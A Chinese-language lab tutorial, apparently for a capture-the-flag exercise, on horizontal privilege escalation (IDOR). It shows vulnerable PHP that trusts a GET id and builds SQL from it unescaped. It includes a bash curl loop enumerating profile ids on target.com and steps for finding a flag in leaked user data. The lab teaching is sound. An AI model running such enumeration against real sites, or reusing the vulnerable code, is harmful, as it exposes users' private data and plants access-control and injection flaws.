# 水平越权

## 概述

水平越权允许同级别用户之间互相访问数据。最常见于通过 ID 参数访问用户资料、订单等场景。

## 漏洞代码

```php
<?php
// 获取用户信息
$id = $_GET['id'];
$sql = "SELECT * FROM users WHERE id = $id";
$result = mysqli_query($conn, $sql);
$user = mysqli_fetch_assoc($result);

echo "用户名: " . $user['username'];
echo "邮箱: " . $user['email'];
echo "余额: " . $user['balance'];
?>
```

## 攻击方式

### 1. 修改 ID 参数

```
正常: /profile?id=1   →  看到自己的信息
攻击: /profile?id=2   →  看到别人的信息
攻击: /profile?id=3   →  看到第三个人的信息
```

### 2. 遍历 ID

```bash
for i in {1..100}; do
  curl "http://target.com/profile?id=$i"
done
```

### 3. Burp Intruder

使用 Burp Suite 的 Intruder 模块遍历 ID 参数。

## 关键点

- 服务器没有验证请求的资源是否属于当前用户
- 只依赖客户端传来的 ID 参数
- 没有 Session 和资源的关联检查

## 练习步骤

1. 登录用户 A，查看自己的资料页面
2. 观察 URL 中的 `?id=` 参数
3. 修改 `?id=` 为其他值
4. 验证是否能看到其他用户的信息
5. 在泄露的信息中查找 flag

## flag

在用户信息或数据库中查找 `CR{...}` 格式的 flag。
